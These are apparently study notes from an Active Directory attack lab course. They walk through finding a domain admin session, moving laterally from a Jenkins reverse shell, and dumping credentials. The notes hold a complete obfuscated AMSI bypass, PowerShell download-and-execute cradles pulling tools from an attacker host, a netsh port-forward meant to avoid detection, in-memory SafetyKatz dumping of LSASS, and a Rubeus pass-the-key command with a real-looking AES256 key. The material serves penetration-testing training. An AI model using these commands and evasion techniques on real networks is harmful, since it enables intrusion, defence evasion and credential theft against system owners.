# Learning Objtetive 7

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* dcorp-mgmt - Process using svcadmin as service account
* dcorp-mgmt - NTLM hash of svcadmin account
* dcorp-adminsrv - We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.
* dcorp-adminsrv - NTLM hash of srvadmin extracted from dcorp-adminsrv
* dcorp-adminsrv - NTLM hash of websvc extracted from dcorp-adminsrv
* dcorp-adminsrv - NTLM hash of appadmin extracted from dcorp-adminsrv

***

## Identify a machine where Domain Admin session is available

We have access to two domain users - student113 and ciadmin and administrative access to dcorpadminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

> * **student113** → usuario de dominio normal
> * **ciadmin** → obtenido mediante **reverse shell en `dcorp-ci` explotando Jenkins**
> * **admin local en `dcorp-adminsrv`** (de ejercicios anteriores)

### Enumeration using Invoke-SessionHunter (Session Hunting - Lateral Movement)&#xD;

We can use `Invoke-SessionHunter.ps1` from the student VM to list sessions on all the remote machines. The script connects to Remote Registry service on remote machines that runs by default. Also, admin access is not required on the remote machines.

#### Invisi-Shell

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

#### Without target

> Enumrate all computers/server of domain

<pre><code>Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

HostName       UserSession         Access
--------       -----------         ------
dcorp-appsrv   dcorp\appadmin       False
dcorp-ci       dcorp\ciadmin        False
dcorp-mgmt     dcorp\mgmtadmin      False
dcorp-mssql    dcorp\sqladmin       False
dcorp-dc       dcorp\Administrator  False
dcorp-mgmt     dcorp\svcadmin       False
us-dc          US\Administrator     False
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\appadmin        True</a>
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\srvadmin        True</a>
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\websvc          True</a>
</code></pre>

To make the above enumeration more opsec friendly and avoid triggering tools like MDI, we can query specific target machines.&#x20;

Now, we need to create 'servers.txt' saving the true hostnames and use the below command:

#### With targets

> Using unil the list of target, dont search computers/servers into domain (User PowerView)
>
> ```
> Get-DomainComputer | select -ExpandProperty dnshostname > C:\AD\Tools\servers.txt
> ```

<pre><code>Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access

HostName       UserSession     Access
--------       -----------     ------
DCORP-APPSRV   dcorp\appadmin   False
DCORP-CI       dcorp\ciadmin    False
DCORP-MGMT     dcorp\mgmtadmin  False
DCORP-MSSQL    dcorp\sqladmin   False
DCORP-MGMT     dcorp\svcadmin   False
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\appadmin    True</a>
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\srvadmin    True</a>
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\websvc      True</a>
</code></pre>

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

> We can see if this user is domain admin comparing it to BloodHound

***

## Enumeration using PowerView from the Jenkins Reverse Shell - Bypassing Security Controls

> We obtained a **reverse shell on `dcorp-ci` as the user `ciadmin`** by abusing a Jenkins job.\
> All the following steps will be performed **inside that reverse shell session**.
>
> From this shell, we start the **Active Directory enumeration phase** using PowerView.
>
> The goal is to **find machines where a Domain Admin has an active session**, which could later allow us to steal credentials or tokens.

&#x20;we first bypass some PowerShell security mechanisms to avoid detection.

### Bypass ScriptBlock Logging

> Info: Bypass Windows logs of PowerShell commands.
>
> Into (user RCE jenkings)

Upload the file sbloggingbypass.txt --->

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/sbloggingbypass.txt'))
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### Bypass AMSI

> Info: AMSI scans scripts before execution.

Upload the file Amsi-Byp.txt to bypass the AMS after, it contains -->

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Amsi-Byp.txt'))
```

> ```
> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
> ```

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### Execute PowerView

Upload PoweView to execute commnads -->

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/PowerView.ps1'))
```

Once we do all, Now run user hunting to find where Domain Admins are logged in -->

> ```
> user / admins
>         │
>         ▼
> logged into
>         │
>         ▼
> dcorp-mgmt (this machine)
> ```

<pre><code>Find-DomainUserLocation

UserDomain      : DCORP-MGMT
UserName        : Administrator
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
<a data-footnote-ref href="#user-content-fn-1">UserName        : svcadmin</a>
<a data-footnote-ref href="#user-content-fn-1">ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local</a>
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
</code></pre>

Great! There is a domain admin session on dcorp-mgmt server!&#x20;

> **ahora mismo hay una sesión cargada en memoria**.

Now, we can abuse this using winrs or PowerShell Remoting!

Use winrs to access dcorp-mgmt


Let's <mark style="background-color:yellow;">check if</mark> we can execute commands on dcorp-mgmt server with it user (ciadmin) and if the winrm port is open:

```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"

COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin
```

> ciadmin → tiene acceso remoto a dcorp-mgmt
>
> ciadmin = Administrators (dcorp-mgmt) (porque para ejecutar comando debes ser local admin o pertenecer al grupo)

It\`s open and we are ciadmin so... we can execute commands too into this machine

We would now run SafetyKatz.exe =(versión modificada de Mimikatz que se usa para dumpear LSASS) on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe =(programa que **descarga y ejecuta otro binario en memoria)** on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.

> Remember upload SafetyKatz to the webshell

<figure><img src="../../../.gitbook/assets/image (3).png" alt="" width="302"><figcaption></figcaption></figure>

> ```
> [ Attacker VM ] 172.16.100.113
>         |
>         |  hosting tools (PowerView, SafetyKatz, bypass scripts)
>         |  reverse shell listener (nc)
>         v
> [ Jenkins server → dcorp-ci ] (reverse shell from Jenkins job abuse)
> User obtained: ciadmin
>         |
>         |  AMSI + ScriptBlockLogging bypass
>         |  Load PowerView
>         |  Find-DomainUserLocation
>         v
>     Domain Admin session discovered
>     svcadmin → dcorp-mgmt
>         |
>         |  test remote execution -->
>         |  --> winrs / PowerShell Remoting
>         v
> [ dcorp-mgmt ]
> Access confirmed as: ciadmin
>         |
>         |  create port forwarding
>         |  netsh portproxy
>         v
>     dcorp-mgmt:8080 → attacker:80
>         |
>         |  download tools through mgmt server
>         |  execute credential dumping
>         v
>    SafetyKatz / Mimikatz
>         |
>         v
>    Dump LSASS
>         |
>         v
>    Steal credentials of svcadmin (Domain Admin)
> ```

Run the following command on the shell of rever shell (ciadmin\dcorp-ci):

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

```
iwr http://172.16.100.113/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Now, copy the Loader.exe to dcorp-mgmt:

```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
## if it give us error us it -->
copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
cmd /c copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

### Port Forwarding - Bypass Detections

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.113"
```

> Note: Please note that we have to use the $null variable to address output redirection issues.
>
> Remeber user the same port that your web server (:280)

### SafetyKatz in-memory using

To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell:

```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4).png" alt="" width="563"><figcaption></figcaption></figure>

Sweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see “Session” in the above output), so you can even get credentials in clear-text from lsasecrets!

***

## Use OverPass-the-Hash to replay svcadmin credentials

Finally, use OverPass-the-Hash to use svcadmin’s credentials.

Run the commands below from an elevated shell on the student VM to use Rubeus. Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.):

> In us machine VM, run it how local admin privileges

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Into it new cmd try to access at the domain controller from the new process!

```
C:\Windows\system32> winrs -r:dcorp-dc cmd /c set username
USERNAME=svcadmin
```

> Note that we did not need to have direct access to `dcorp-mgmt` from the student VM.

### Abuse Derivative Local Admin

Now moving on to the next task, we need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges

> Remeber use a new invishell admin priv

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

> We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error  ‘**This program is blocked by group policy. For more information, contact your system administrator**’. Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode. This could be because of an application allowlist on dcorp-adminsrv and we drop into a `Constrained Language Mode (CLM)` when using PSRemoting.

### Gaps in Applocker Policy

Let’s check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute:

```
winrs -r:dcorp-adminsrv cmd
```

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Looks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!

First search the scripts and examine its at found something -->

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**A default rule is enabled that allows everyone to run scripts from the `C:\Program Files` folder!** We can also confirm this using PowerShell commands on dcrop-adminsrv. Run the below commands from a PowerShell session as studentx:

```
PS C:\Users\student113> Enter-PSSession dcorp-adminsrv

[dcorp-adminsrv]: PS C:\Users\studentx\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

> It confirm us that this ps be in restrictive mode.

Now execute this command to read the current enable rules -->

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Here, `Everyone` can run scripts from the ‘**Program Files**’ directory. That means, we can drop scripts in the Program Files directory there and execute them. Also, in the Constrained Language Mode, we cannot run scripts using dot sourcing (`. .\Invoke-TheKat.ps1`). So, we must modify `Invoke-TheKat.ps1` to include the function call in the script itself and transfer the modified script (Invoke-TheKatEx.ps1) to the target server.

#### Create Invoke-TheKatEx-keys-stdX.ps1



[^1]: 
